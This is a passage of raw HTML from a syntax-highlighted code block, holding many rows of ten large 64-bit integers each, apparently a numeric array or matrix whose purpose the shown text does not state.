class="line">[<span class="number">13274782473659071826</span>, <span class="number">12069531070707926879</span>, <span class="number">2694160561917132000</span>, <span class="number">1429638035186591909</span>, <span class="number">6411304059327083710</span>, <span class="number">18104866398249088891</span>, <span class="number">13303928540647175276</span>, <span class="number">14080609692887064929</span>, <span class="number">12331376976310796138</span>, <span class="number">2314783974805559255</span>],</span><br><span class="line">[<span class="number">1371925501023810594</span>, <span class="number">2429139202095172975</span>, <span class="number">1589908281180970800</span>, <span class="number">17469951032939227189</span>, <span class="number">6388256481685821070</span>, <span class="number">16514583541001966731</span>, <span class="number">14254875832853055932</span>, <span class="number">5908996560254623729</span>, <span class="number">1892393035958901818</span>, <span class="number">1447910965197364199</span>],</span><br><span class="line">[<span class="number">14470663731499396148</span>, <span class="number">2351617493142547017</span>, <span class="number">14687654437159331314</span>, <span class="number">17323976183678073471</span>, <span class="number">14762735956375766144</span>, <span class="number">4057856935902525125</span>, <span class="number">3290967471630959454</span>, <span class="number">5715826658021583003</span>, <span class="number">7010413855588643340</span>, <span class="number">4103210119168048513</span>],</span><br><span class="line">[<span class="number">17829644423943822696</span>, <span class="number">12760356387293359437</span>, <span class="number">13467619258892875270</span>, <span class="number">6928525178130812899</span>, <span class="number">16899635448287299700</span>, <span class="number">3929969288121927561</span>, <span class="number">12913463848479279154</span>, <span class="number">5585290007011784127</span>, <span class="number">16450129009622072512</span>, <span class="number">9807513167640354821</span>],</span><br><span class="line">[<span class="number">13382992608650847226</span>, <span class="number">1089286311430877863</span>, <span class="number">1373779193892366152</span>, <span class="number">2557044010025506477</span>, <span class="number">10415340028373982438</span>, <span class="number">17682187156841826883</span>, <span class="number">2585804957255648340</span>, <span class="number">12399845387253770985</span>, <span class="number">7039104329870823698</span>, <span class="number">6082852844638493215</span>],</span><br><span class="line">[<span class="number">4886494782055373126</span>, <span class="number">5126746635048816675</span>, <span class="number">3257380417886869940</span>, <span class="number">3398319949679406537</span>, <span class="number">13123147643364431730</span>, <span class="number">1606727780377760255</span>, <span class="number">183752403808147968</span>, <span class="number">12678915862762209861</span>, <span class="number">7848223066243554526</span>, <span class="number">6571813433228265499</span>],</span><br><span class="line">[<span class="number">1464063290508461950</span>, <span class="number">8786646676536116539</span>, <span class="number">15982810322286389548</span>, <span class="number">14456011888897333537</span>, <span class="number">1340640353600226858</span>, <span class="number">270464029867895191</span>, <span class="number">215273987175216632</span>, <span class="number">14853905115089947677</span>, <span class="number">10348528887181050902</span>, <span class="number">13072218414529550899</span>],</span><br><span class="line">[<span class="number">4123571989791835800</span>, <span class="number">7825306189993396029</span>, <span class="number">4990548971967329206</span>, <span class="number">12306485738973786195</span>, <span class="number">597288598551873188</span>, <span class="number">4319425152660146809</span>, <span class="number">2892430354197304034</span>, <span class="number">15110253702518462255</span>, <span class="number">9589837346039005168</span>, <span class="number">16062734296857050101</span>],</span><br><span class="line">[<span class="number">1595176522484458364</span>, <span class="number">17833459682879869105</span>, <span class="number">13023609253880561658</span>, <span class="number">13185322979700276903</span>, <span class="number">5896825987551077192</span>, <span class="number">1052623519414190765</span>, <span class="number">17290790618450508006</span>, <span class="number">12472931955673749059</span>, <span class="number">12082077550849310804</span>, <span class="number">3559867691672622825</span>],</span><br><span class="line">[<span class="number">1911293633918758724</span>, <span class="number">2752052224427490713</span>, <span class="number">5424162748401343106</span>, <span class="number">5332348165501642063</span>, <span class="number">17443886019131821712</span>, <span class="number">4589770528974843157</span>, <span class="number">3099517246201800430</span>, <span class="number">10952505177119161963</span>, <span class="number">17853094272840110876</span>, <span class="number">14378395961137243857</span>],</span><br><span class="line">[<span class="number">5965554835967892180</span>, <span class="number">5794914060174424937</span>, <span class="number">12467444604134736786</span>, <span class="number">11703450294657463967</span>, <span class="number">14328075161854294304</span>, <span class="number">10959750261340071397</span>, <span class="number">18353005084082861822</span>, <span class="number">11978753789467955899</span>, <span class="number">14877272230068685996</span>, <span class="number">11960859820713994913</span>],</span><br><span class="line">[<span class="number">13635279752893255972</span>, <span class="number">50355190447529721</span>, <span class="number">3474508140879550818</span>, <span class="number">18380132836174387119</span>, <span class="number">13850568683783201392</span>, <span class="number">14905291421853763701</span>, <span class="number">13894184053884356558</span>, <span class="number">17914751958833470155</span>, <span class="number">186032220969482492</span>, <span class="number">12836223246894292017</span>],</span><br><span class="line">[<span class="number">16452900385875069348</span>, <span class="number">9998738129097136505</span>, <span class="number">7383400180449009122</span>, <span class="number">11392522460823735855</span>, <span class="number">11320798701036606192</span>, <span class="number">6371859275724659445</span>, <span class="number">15383176329681814606</span>, <span class="number">9974754546600765771</span>, <span class="number">5728532988199428476</span>, <span class="number">7887150637859980977</span>],</span><br><span class="line">[<span class="number">975484705026012068</span>, <span class="number">11968212425666177913</span>, <span class="number">14149918127746004962</span>, <span class="number">17113658981577658415</span>, <span class="number">250849011447127280</span>, <span class="number">17308581789851782389</span>, <span class="number">13700522782361681486</span>, <span class="number">4552124223768890187</span>, <span class="number">501922186991045500</span>, <span class="number">16185886828672587953</span>],</span><br><span class="line">[<span class="number">14049561938669887530</span>, <span class="number">10189081935325555607</span>, <span class="number">2070378736500375544</span>, <span class="number">13728924302559051293</span>, <span class="number">6511829117387406870</span>, <span class="number">6594351330701835315</span>, <span class="number">12288384049397398020</span>, <span class="number">17795016091490640729</span>, <span class="number">10371001448023803714</span>, <span class="number">14622825112679494927</span>],</span><br><span class="line">[<span class="number">8225176568250711902</span>, <span class="number">14134860998012572827</span>, <span class="number">16074717029970841100</span>, <span class="number">2350830645414939009</span>, <span class="number">14633361943954378762</span>, <span class="number">13577794152536347383</span>, <span class="number">14530592839530388696</span>, <span class="number">6486725947281032829</span>, <span class="number">4862232593362026486</span>, <span class="number">3452655615207898515</span>],</span><br><span class="line">[<span class="number">7325877545279738858</span>, <span class="number">7423460634144087639</span>, <span class="number">14156693765784153528</span>, <span class="number">17581178006209909469</span>, <span class="number">14062917637362898390</span>, <span class="number">11110625145143304947</span>, <span class="number">10316627992796425156</span>, <span class="number">10871056701990374425</span>, <span class="number">12233149488953770754</span>, <span class="number">13983831420880359375</span>],</span><br><span class="line">[<span class="number">16083375904554397700</span>, <span class="number">2948292991680344409</span>, <span class="number">518031615138696514</span>, <span class="number">17297437370860507919</span>, <span class="number">12931557871963743056</span>, <span class="number">6833777627439793365</span>, <span class="number">10362054450606951854</span>, <span class="number">14005482290916716587</span>, <span class="number">7147586240356760540</span>, <span class="number">13568104668168135313</span>],</span><br><span class="line">[<span class="number">9860557894645199144</span>, <span class="number">16295708076974882829</span>, <span class="number">17599212888693818310</span>, <span class="number">15307324528752608419</span>, <span class="number">4740980282485538868</span>, <span class="number">13532990238439804489</span>, <span class="number">11439122766868929010</span>, <span class="number">14536219818154933887</span>, <span class="number">6874987472374651008</span>, <span class="number">13205533751112129221</span>],</span><br><span class="line">[<span class="number">4113439792173103428</span>, <span class="number">7126184554300862361</span>, <span class="number">12091388330311160962</span>, <span class="number">4202311474540283727</span>, <span class="number">13258330637636302992</span>, <span class="number">10934354385136877333</span>, <span class="number">16600689626062471406</span>, <span class="number">1749451628318326891</span>, <span class="number">10031697911707245852</span>, <span class="number">9657625180546554065</span>],</span><br><span class="line">[<span class="number">12079193783672782500</span>, <span class="number">3360887756492169849</span>, <span class="number">10540326313445100258</span>, <span class="number">7859496753039404847</span>, <span class="number">7349697822141937648</span>, <span class="number">9067059737635804149</span>, <span class="number">16884567464455283022</span>, <span class="number">2890278403712776779</span>, <span class="number">14961769119086081660</span>, <span class="number">17791145162914295729</span>],</span><br><span class="line">[<span class="number">11283122857066504942</span>, <span class="number">3772226041787673195</span>, <span class="number">2029179851415727900</span>, <span class="number">10886201231718363857</span>, <span class="number">13278122040185041562</span>, <span class="number">12299961160999838663</span>, <span class="number">147092718349493480</span>, <span class="number">10149397566115050189</span>, <span class="number">17778901334685053318</span>, <span class="number">9259083228438272355</span>],</span><br><span class="line">[<span class="number">7399210033346454230</span>, <span class="number">12483402310747448307</span>, <span class="number">12804532050934558916</span>, <span class="number">16515740050135639321</span>, <span class="number">14334674963076464642</span>, <span class="number">11415136545669824719</span>, <span class="number">12881170555416737808</span>, <span class="number">3357052785696431253</span>, <span class="number">10275713328539137134</span>, <span class="number">8047944868237500907</span>],</span><br><span class="line">[<span class="number">11694113410536044248</span>, <span class="number">13683830157476333693</span>, <span class="number">3400333106679892470</span>, <span class="number">13262055476397961107</span>, <span class="number">11191368259691287268</span>, <span class="number">15887902896607205305</span>, <span class="number">7907399517033620770</span>, <span class="number">10654988537742836335</span>, <span class="number">15771190229583194160</span>, <span class="number">18300969566086403381</span>],</span><br><span class="line">[<span class="number">8049735646312071314</span>, <span class="number">2029437384246372255</span>, <span class="number">10903970997032824352</span>, <span class="number">14504235846882815717</span>, <span class="number">4668093454598497278</span>, <span class="number">8503799114233934779</span>, <span class="number">14913072597145399724</span>, <span class="number">14431085149007242145</span>, <span class="number">18067439374893472426</span>, <span class="number">10721463929109639191</span>],</span><br><span class="line">[<span class="number">2696097122251550912</span>, <span class="number">1563260698261496837</span>, <span class="number">15631267811495523742</span>, <span class="number">8646322718037144539</span>, <span class="number">6300457185857321548</span>, <span class="number">10456432128835499713</span>, <span class="number">2070798014976967242</span>, <span class="number">13757854517443878455</span>, <span class="number">8508013944440481048</span>, <span class="number">15203895881397092285</span>],</span><br><span class="line">[<span class="number">17685177855345059336</span>, <span class="number">2792163153978687597</span>, <span class="number">8191816887433928102</span>, <span class="number">11833043021654490627</span>, <span class="number">4823229250939582228</span>, <span class="number">761424988059244713</span>, <span class="number">15644836028668782034</span>, <span class="number">9582529702991966687</span>, <span class="number">15558506926611394912</span>, <span class="number">3625821661032255269</span>],</span><br><span class="line">[<span class="number">10285848704834387372</span>, <span class="number">8747285832609767329</span>, <span class="number">13266912091368294058</span>, <span class="number">11526474692644260887</span>, <span class="number">2116758622943281784</span>, <span class="number">16929136467119581853</span>, <span class="number">5965539587549396118</span>, <span class="number">5793861919298196659</span>, <span class="number">12394846883674985604</span>, <span class="number">6694207582934632409</span>],</span><br><span class="line">[<span class="number">16662993260956209502</span>, <span class="number">6048402435986255515</span>, <span class="number">11511398461441495052</span>, <span class="number">1076498669952439169</span>, <span class="number">491431931880096266</span>, <span class="number">15462059226017090807</span>, <span class="number">15417674393734823640</span>, <span class="number">12355120966258389117</span>, <span class="number">3953119281189474806</span>, <span class="number">14510813370140039059</span>],</span><br><span class="line">[<span class="number">808205804364973320</span>, <span class="number">425968280054504301</span>, <span class="number">10945067250051245222</span>, <span class="number">17339877305153855747</span>, <span class="number">15859913338204743188</span>, <span class="number">5976119987263734697</span>, <span class="number">6523909499587558610</span>, <span class="number">7427897702512305375</span>, <span class="number">14462851483191177312</span>, <span class="number">1812572359875447333</span>],</span><br><span class="line">[<span class="number">3464937459606526348</span>, <span class="number">17719755828335698689</span>, <span class="number">5178043290332802954</span>, <span class="number">6796849632481923191</span>, <span class="number">7814022798513909848</span>, <span class="number">4211994959882782717</span>, <span class="number">13926491126268733302</span>, <span class="number">1697195879645913875</span>, <span class="number">6426051253310747748</span>, <span class="number">675678709412355897</span>],</span><br><span class="line">[<span class="number">10444205669711294678</span>, <span class="number">1227172335406819827</span>, <span class="number">10887914848232361668</span>, <span class="number">13396361579650890521</span>, <span class="number">2011745310433865218</span>, <span class="number">9683217903969838799</span>, <span class="number">4059248720375019024</span>, <span class="number">3387000600233038485</span>, <span class="number">12342112531565036142</span>, <span class="number">3055537287348119531</span>],</span><br><span class="line">[<span class="number">17779609461642040498</span>, <span class="number">9307943988470387775</span>, <span class="number">15058836698332001600</span>, <span class="number">6042064057173219973</span>, <span class="number">11074050323342042654</span>, <span class="number">7792965288509326939</span>, <span class="number">2759026769566561996</span>, <span class="number">5905406362997261633</span>, <span class="number">1644669425200917194</span>, <span class="number">2801725896605976759</span>],</span><br><span class="line">[<span class="number">13662389174465413016</span>, <span class="number">1920905278926365757</span>, <span class="number">3415255729952375990</span>, <span class="number">14291716482199323987</span>, <span class="number">8451001365147119524</span>, <span class="number">11270027910155147129</span>, <span class="number">2868674704903984098</span>, <span class="number">13471113901279386671</span>, <span class="number">7169655502800099568</span>, <span class="number">15090883776758528245</span>],</span><br><span class="line">[<span class="number">4833394564540976836</span>, <span class="number">1462831626555472665</span>, <span class="number">8701661863779855874</span>, <span class="number">10118858242104403663</span>, <span class="number">15671687977950443024</span>, <span class="number">11435314203426574997</span>, <span class="number">14273428940632506990</span>, <span class="number">7189160997036746731</span>, <span class="number">16436762879087182492</span>, <span class="number">8885250160732943441</span>],</span><br><span class="line">[<span class="number">10230397123600839054</span>, <span class="number">4921126727494933387</span>, <span class="number">7516350870378474684</span>, <span class="number">2119375992247308017</span>, <span class="number">17109734949097391930</span>, <span class="number">18426834844018291431</span>, <span class="number">17073007225012598920</span>, <span class="number">15892621882167573741</span>, <span class="number">8233009520699042854</span>, <span class="number">14675334716947408515</span>],</span><br><span class="line">[<span class="number">6982897219557017034</span>, <span class="number">2204562232985833399</span>, <span class="number">4540841486346091672</span>, <span class="number">18170157378527499581</span>, <span class="number">17809006179857512886</span>, <span class="number">11336317545337982547</span>, <span class="number">7442659532519627940</span>, <span class="number">15481417753696434297</span>, <span class="number">16753412803609524450</span>, <span class="number">12287350879064986927</span>],</span><br><span class="line">[<span class="number">12335665912060183356</span>, <span class="number">2610720541513277297</span>, <span class="number">14119020701030169018</span>, <span class="number">14981736538184978279</span>, <span class="number">722153007028610824</span>, <span class="number">12935069337555043693</span>, <span class="number">7076068753239537318</span>, <span class="number">8633398057079732995</span>, <span class="number">5408655579795925012</span>, <span class="number">4262353531727793577</span>],</span><br><span class="line">[<span class="number">4267092785397013934</span>, <span class="number">17728241086750687275</span>, <span class="number">5763526120967015388</span>, <span class="number">10301676798823477905</span>, <span class="number">9839424317857014106</span>, <span class="number">14837491278590115207</span>, <span class="number">9215974168692610472</span>, <span class="number">8712919133665367693</span>, <span class="number">10895609864204719174</span>, <span class="number">13927317681743558435</span>],</span><br><span class="line">[<span class="number">15352056503978231050</span>, <span class="number">7827486573053500407</span>, <span class="number">5140995403114531288</span>, <span class="number">4240545414421178237</span>, <span class="number">15896472489418024182</span>, <span class="number">8498701420980123283</span>, <span class="number">14561331762632406500</span>, <span class="number">8607711641320261305</span>, <span class="number">3636292892392378402</span>, <span class="number">11096536616849938799</span>],</span><br><span class="line">[<span class="number">17027027727640810764</span>, <span class="number">12720036563514190977</span>, <span class="number">10685551418130251530</span>, <span class="number">17880028976314842615</span>, <span class="number">16236890500893733848</span>, <span class="number">13540800139094538621</span>, <span class="number">11978005912045584118</span>, <span class="number">14825668687925033107</span>, <span class="number">8400215412801945572</span>, <span class="number">7765797198338144441</span>],</span><br><span class="line">[<span class="number">15021933103315449546</span>, <span class="number">3495716001031128247</span>, <span class="number">1396731112923678104</span>, <span class="number">4140726423186031165</span>, <span class="number">9008962094192876214</span>, <span class="number">12875830066893255507</span>, <span class="number">2988559077576152484</span>, <span class="number">3296391541949453689</span>, <span class="number">6090087509997685218</span>, <span class="number">14387668568230144559</span>],</span><br><span class="line">[<span class="number">7157414067549684176</span>, <span class="number">14246224744479866197</span>, <span class="number">5312071462504532014</span>, <span class="number">16044793512331228331</span>, <span class="number">286107928281657948</span>, <span class="number">1294702977724846865</span>, <span class="number">15547529168176227290</span>, <span class="number">2868356329005689351</span>, <span class="number">13449145964297049128</span>, <span class="number">5653867851018809101</span>],</span><br><span class="line">[<span class="number">7374594347533511120</span>, <span class="number">10784919989654373717</span>, <span class="number">6289716337769721902</span>, <span class="number">9715313610791124139</span>, <span class="number">6273852491043707484</span>, <span class="number">8620708186696129297</span>, <span class="number">4533054523327269850</span>, <span class="number">17632856930228793863</span>, <span class="number">17628763394665921576</span>, <span class="number">17346309440827733773</span>],</span><br><span class="line">[<span class="number">2342052956166955452</span>, <span class="number">14027701385843513329</span>, <span class="number">8680703790305735738</span>, <span class="number">8672751172390114279</span>, <span class="number">8124020536212233608</span>, <span class="number">7155094787357570541</span>, <span class="number">14086194411224025382</span>, <span class="number">12716722541561067395</span>, <span class="number">10456883903364724372</span>, <span class="number">2101970457493468713</span>],</span><br><span class="line">[<span class="number">4772590411956129490</span>, <span class="number">15714089171910557407</span>, <span class="number">14360996586674467424</span>, <span class="number">13231328573932016677</span>, <span class="number">9071211989541121598</span>, <span class="number">17171072845922187003</span>, <span class="number">4212405651219599852</span>, <span class="number">13954828828509115617</span>, <span class="number">3652497334232293610</span>, <span class="number">12214643103804088151</span>],</span><br><span class="line">[<span class="number">7024552045636262550</span>, <span class="number">5078745232453774003</span>, <span class="number">18392027712538477188</span>, <span class="number">14671315152905416153</span>, <span class="number">16196565570157927362</span>, <span class="number">10758379918323891087</span>, <span class="number">4458451415966420432</span>, <span class="number">12485242522330184021</span>, <span class="number">12931506650143323182</span>, <span class="number">6830243321830822059</span>],</span><br><span class="line">[<span class="number">8964158918272436998</span>, <span class="number">9784410928382949603</span>, <span class="number">11041567404879664500</span>, <span class="number">5551643914605234313</span>, <span class="number">14128548633570135346</span>, <span class="number">15639163883442654911</span>, <span class="number">9191151682389195200</span>, <span class="number">7000167578729713925</span>, <span class="number">3396217015901918878</span>, <span class="number">12978045212717783259</span>],</span><br><span class="line">[<span class="number">930350092441786838</span>, <span class="number">8853924157354637043</span>, <span class="number">2178212425054752708</span>, <span class="number">2722704739101523993</span>, <span class="number">3399186260909639426</span>, <span class="number">13182923118250501071</span>, <span class="number">5731235547516544784</span>, <span class="number">8073627230741006229</span>, <span class="number">3677956709842881390</span>, <span class="number">13971340020934644971</span>],</span><br><span class="line">[<span class="number">8133993277912905324</span>, <span class="number">7843213964703918945</span>, <span class="number">6226185426993410410</span>, <span class="number">5331680767225631191</span>, <span class="number">17397835538087071544</span>, <span class="number">1412287336887081565</span>, <span class="number">5214105876660869974</span>, <span class="number">9285168089118547571</span>, <span class="number">13487299643055027524</span>, <span class="number">8286471685319318425</span>],</span><br><span class="line">[<span class="number">9877798999468753552</span>, <span class="number">17485344309800136981</span>, <span class="number">7450392585088596718</span>, <span class="number">16014998380955279979</span>, <span class="number">16676987937050773276</span>, <span class="number">7014035086511155921</span>, <span class="number">4353075052821416602</span>, <span class="number">5214273465324919751</span>, <span class="number">9296731706937982184</span>, <span class="number">14285189272596015821</span>],</span><br><span class="line">[<span class="number">13345670530455246326</span>, <span class="number">16960806989643967379</span>, <span class="number">8150805641731997412</span>, <span class="number">9003267068221273017</span>, <span class="number">12482873274852634914</span>, <span class="number">12768028574192434799</span>, <span class="number">13997000154929075248</span>, <span class="number">6562318857209508149</span>, <span class="number">10078143378426823566</span>, <span class="number">12862362384197416331</span>],</span><br><span class="line">[<span class="number">3527923150139187946</span>, <span class="number">3619024401379797335</span>, <span class="number">9905010736981845176</span>, <span class="number">916210124493907421</span>, <span class="number">7878266368950957270</span>, <span class="number">8644801320039054835</span>, <span class="number">6195480723989131972</span>, <span class="number">3213056259930418969</span>, <span class="number">339953050684289538</span>, <span class="number">5010016423506426575</span>],</span><br><span class="line">[<span class="number">2251345810918236694</span>, <span class="number">7768908363681919027</span>, <span class="number">1099098956475416068</span>, <span class="number">2050851701965502297</span>, <span class="number">12381558919652797250</span>, <span class="number">5777338065403635983</span>, <span class="number">11254700964950298960</span>, <span class="number">1811115485769460437</span>, <span class="number">14286504075835460526</span>, <span class="number">8091345326040540715</span>],</span><br><span class="line">[<span class="number">16278112069030549596</span>, <span class="number">16385088340534825233</span>, <span class="number">5319707000620292570</span>, <span class="number">16571645642318706695</span>, <span class="number">18192160823708113448</span>, <span class="number">880499823610318093</span>, <span class="number">5414255607983293638</span>, <span class="number">4648755476656228771</span>, <span class="number">7169478636217407796</span>, <span class="number">15078679982552795977</span>],</span><br><span class="line">[<span class="number">426316868124203456</span>, <span class="number">10969119826860486917</span>, <span class="number">552761031281981086</span>, <span class="number">1247023011037591771</span>, <span class="number">12257611466755625804</span>, <span class="number">15671707889208357825</span>, <span class="number">11436688080222696266</span>, <span class="number">14368226439564874551</span>, <span class="number">13730188423370108440</span>, <span class="number">6599053453350350013</span>],</span><br><span class="line">[<span class="number">13150327040177579016</span>, <span class="number">3482106160484922989</span>, <span class="number">457652115235515302</span>, <span class="number">13131251877541004291</span>, <span class="number">2165919938561266964</span>, <span class="number">1874523171051007657</span>, <span class="number">214890286552667090</span>, <span class="number">14827429772134029279</span>, <span class="number">8521730223222681440</span>, <span class="number">16150319117368919333</span>],</span><br><span class="line">[<span class="number">9685667656530826836</span>, <span class="number">4228281647083193577</span>, <span class="number">15050272543097082642</span>, <span class="number">5451137345963811871</span>, <span class="number">7193595397311986848</span>, <span class="number">16742736498078750565</span>, <span class="number">11550685797441588862</span>, <span class="number">3787324853958912059</span>, <span class="number">3070997891231209516</span>, <span class="number">8984669684148388897</span>],</span><br><span class="line">[<span class="number">14752986476655224134</span>, <span class="number">3385142835185126435</span>, <span class="number">12213926743259104692</span>, <span class="number">12657461967948401097</span>, <span class="number">6367904324090749810</span>, <span class="number">15110284666942049791</span>, <span class="number">9591973891266545152</span>, <span class="number">16210155917557308997</span>, <span class="number">11696113888881223902</span>, <span class="number">13821863163293729819</span>],</span><br><span class="line">[<span class="number">4848477814157730098</span>, <span class="number">2503575850111447743</span>, <span class="number">6726036994303929792</span>, <span class="number">2927950764232365317</span>, <span class="number">17561161994937690782</span>, <span class="number">12681812859579808987</span>, <span class="number">8048115846657894220</span>, <span class="number">1917671208108152769</span>, <span class="number">3192104843495679818</span>, <span class="number">17341049390396839735</span>],</span><br><span class="line">[<span class="number">15624023056168666090</span>, <span class="number">8146434600483966551</span>, <span class="number">8701665222107143608</span>, <span class="number">10119089966687257309</span>, <span class="number">15687676974167344598</span>, <span class="number">12538554942392783603</span>, <span class="number">16610063634462694340</span>, <span class="number">2396258207933709337</span>, <span class="number">17767863757749531394</span>, <span class="number">8497490419887259599</span>],</span><br><span class="line">[<span class="number">9904744802680554204</span>, <span class="number">897860657704830353</span>, <span class="number">6612153160504639578</span>, <span class="number">13516710305790892167</span>, <span class="number">10315807414093978792</span>, <span class="number">10814436771521575309</span>, <span class="number">8326374286606631750</span>, <span class="number">2670759490861490723</span>, <span class="number">18261708206056895412</span>, <span class="number">5679269205676273609</span>],</span><br><span class="line">[<span class="number">4386764090407132678</span>, <span class="number">7538817058739328995</span>, <span class="number">3669542989146255476</span>, <span class="number">13390793292867456905</span>, <span class="number">1627533522376945714</span>, <span class="number">1619348601751944639</span>, <span class="number">1054589078626870464</span>, <span class="number">17426414204125407237</span>, <span class="number">3384215293532244382</span>, <span class="number">12149926369210243035</span>],</span><br><span class="line">[<span class="number">9075652399451677632</span>, <span class="number">17477461129750553349</span>, <span class="number">6906453161667326110</span>, <span class="number">15376666312306711259</span>, <span class="number">9525563347718634828</span>, <span class="number">11627828412751496641</span>, <span class="number">9110165310342548810</span>, <span class="number">1412107907511113015</span>, <span class="number">5201725249719040024</span>, <span class="number">8430904830132281021</span>],</span><br><span class="line">[<span class="number">15464708125926866968</span>, <span class="number">15600448487509378749</span>, <span class="number">6519789362993140022</span>, <span class="number">7143608277497422803</span>, <span class="number">13293625230873831460</span>, <span class="number">13369681318526341625</span>, <span class="number">170807292839991394</span>, <span class="number">11785703205959406255</span>, <span class="number">1556781967978760560</span>, <span class="number">15184235421986720629</span>],</span><br><span class="line">[<span class="number">7629119045957438128</span>, <span class="number">9900380107195785653</span>, <span class="number">596696669255800334</span>, <span class="number">4278582031231119883</span>, <span class="number">74254975594446140</span>, <span class="number">5123593316016783729</span>, <span class="number">3039801404676596666</span>, <span class="number">6832112111880102247</span>, <span class="number">10247133876988264712</span>, <span class="number">6075962711227303789</span>],</span><br><span class="line">[<span class="number">6336908066116601936</span>, <span class="number">12971542866725846485</span>, <span class="number">9592742266024929966</span>, <span class="number">16263173775885861163</span>, <span class="number">15354346113551323356</span>, <span class="number">7985469633596869521</span>, <span class="number">16041826580607000154</span>, <span class="number">81389639309913735</span>, <span class="number">5615885112384047784</span>, <span class="number">114447206598713229</span>],</span><br><span class="line">[<span class="number">11040999432439563636</span>, <span class="number">5512453816238274697</span>, <span class="number">11424431846249921842</span>, <span class="number">13522546295443439295</span>, <span class="number">10718490700119730624</span>, <span class="number">1706095359879348485</span>, <span class="number">7040115389417735838</span>, <span class="number">6152615953375430875</span>, <span class="number">255387087585043276</span>, <span class="number">17621709043367986113</span>],</span><br><span class="line">[<span class="number">14957465477493635322</span>, <span class="number">17494193893035498407</span>, <span class="number">8061013828328535112</span>, <span class="number">2807631943382374317</span>, <span class="number">9259163356288311782</span>, <span class="number">11692973077768758083</span>, <span class="number">13605147196533588308</span>, <span class="number">16417952875340012521</span>, <span class="number">7587359902178215442</span>, <span class="number">7018999186429420319</span>],</span><br><span class="line">[<span class="number">4160247362847484440</span>, <span class="number">10355906930833152189</span>, <span class="number">13581303426524539702</span>, <span class="number">14772732744715658707</span>, <span class="number">4747635331355111972</span>, <span class="number">13992188610440348665</span>, <span class="number">6230322287487373922</span>, <span class="number">5617124141309113519</span>, <span class="number">199940202428248944</span>, <span class="number">13795873967549177205</span>],</span><br><span class="line">[<span class="number">9602519741905125674</span>, <span class="number">16937819611619365015</span>, <span class="number">6564676558034434296</span>, <span class="number">10240824735346727709</span>, <span class="number">5640631937961250582</span>, <span class="number">1821978171425706291</span>, <span class="number">15036029386116424452</span>, <span class="number">4468359514298396761</span>, <span class="number">13168901307236550722</span>, <span class="number">4763730587553970703</span>],</span><br><span class="line">[<span class="number">7373837261793968386</span>, <span class="number">10732681073625925071</span>, <span class="number">2685231131806765328</span>, <span class="number">813507357571291541</span>, <span class="number">791775451290461550</span>, <span class="number">17739017991622743787</span>, <span class="number">6507132557138914716</span>, <span class="number">6270288673555876689</span>, <span class="number">8374804780035804442</span>, <span class="number">6012463537474406471</span>],</span><br><span class="line">[<span class="number">2329707387181522384</span>, <span class="number">13175857125848631637</span>, <span class="number">5243682071787553838</span>, <span class="number">11325925552859734187</span>, <span class="number">6725612051520491100</span>, <span class="number">2898629712175095569</span>, <span class="number">15538009402986078170</span>, <span class="number">2211492530885400071</span>, <span class="number">5019032041416192040</span>, <span class="number">14271817530945321741</span>],</span><br><span class="line">[<span class="number">8739309380112934642</span>, <span class="number">12716536869086838655</span>, <span class="number">10444072502642941312</span>, <span class="number">1217983807690437573</span>, <span class="number">10253906435801986142</span>, <span class="number">6543269269374082459</span>, <span class="number">8763721817782450956</span>, <span class="number">14400995068283464321</span>, <span class="number">15991223804952802570</span>, <span class="number">15036542192879832055</span>],</span><br><span class="line">[<span class="number">3358427551366085530</span>, <span class="number">10370572159745282247</span>, <span class="number">14593204221461513704</span>, <span class="number">10806911300528658381</span>, <span class="number">7807116788095363718</span>, <span class="number">3735480241003099747</span>, <span class="number">17940463670989711604</span>, <span class="number">1960140359750142473</span>, <span class="number">6122476306792969394</span>, <span class="number">16622495547104752703</span>],</span><br><span class="line">[<span class="number">8362192087476912076</span>, <span class="number">5142187750910833217</span>, <span class="number">4322817412366011338</span>, <span class="number">3126496273901956535</span>, <span class="number">12814058088429933208</span>, <span class="number">17173036637316465469</span>, <span class="number">4347907257424814006</span>, <span class="number">4857695582959340627</span>, <span class="number">3139601897422574244</span>, <span class="number">13718346111352555129</span>],</span><br><span class="line">[<span class="number">9637178809775025514</span>, <span class="number">882551220932902359</span>, <span class="number">5555802023241607992</span>, <span class="number">14415458129479919197</span>, <span class="number">16989175027508189014</span>, <span class="number">10108200254363290227</span>, <span class="number">14936286823813615940</span>, <span class="number">16032866789114161049</span>, <span class="number">17909908100013567106</span>, <span class="number">18298550036105723727</span>],</span><br><span class="line">[<span class="number">18157426400011258858</span>, <span class="number">16930568662236902999</span>, <span class="number">6064361050644555192</span>, <span class="number">12612542872864172765</span>, <span class="number">3268486763278994902</span>, <span class="number">4164657781736028915</span>, <span class="number">10660225834142720964</span>, <span class="number">16132563681175233561</span>, <span class="number">6342249578518018818</span>, <span class="number">13340107222423611343</span>],</span><br><span class="line">[<span class="number">207789459502672138</span>, <span class="number">14337472705684377591</span>, <span class="number">11608180785615818200</span>, <span class="number">7754479037980736381</span>, <span class="number">103475483093813494</span>, <span class="number">7139808333473131155</span>, <span class="number">13031429093197707748</span>, <span class="number">13724891892583357113</span>, <span class="number">6233592829064508450</span>, <span class="number">5842791510131395951</span>],</span><br><span class="line">[<span class="number">3441518153478150654</span>, <span class="number">16103823705477775803</span>, <span class="number">4359191255393433516</span>, <span class="number">5636291442794086817</span>, <span class="number">1522484004891406506</span>, <span class="number">12817675968959290903</span>, <span class="number">17422670393842146424</span>, <span class="number">3125892383987248285</span>, <span class="number">12772389684315063958</span>, <span class="number">14297916753390487219</span>],</span><br><span class="line">[<span class="number">16496674539259128832</span>, <span class="number">13019154712597240901</span>, <span class="number">12877959631151144670</span>, <span class="number">3135499011370504731</span>, <span class="number">13435246973759758732</span>, <span class="number">4694837503945771777</span>, <span class="number">10349138519195875210</span>, <span class="number">13114283023552428151</span>, <span class="number">995069013349513304</span>, <span class="number">13319529699987763197</span>],</span><br><span class="line">[<span class="number">18053129989247845630</span>, <span class="number">9734116319561390267</span>, <span class="number">7571239396192070316</span>, <span class="number">5906684273385406625</span>, <span class="number">1732845241982921642</span>, <span class="number">8885857254564283671</span>, <span class="number">4381596132520370040</span>, <span class="number">7182227964552706973</span>, <span class="number">15958383637688439190</span>, <span class="number">12770570651638758835</span>],</span><br><span class="line">[<span class="number">19529414742290256</span>, <span class="number">1347529617218027733</span>, <span class="number">745823219496155566</span>, <span class="number">14568313997815630891</span>, <span class="number">9089485868962744284</span>, <span class="number">18431970526014152337</span>, <span class="number">17427369282727001434</span>, <span class="number">3450115717042243975</span>, <span class="number">16697055591400214952</span>, <span class="number">8398703236622631565</span>],</span><br><span class="line">[<span 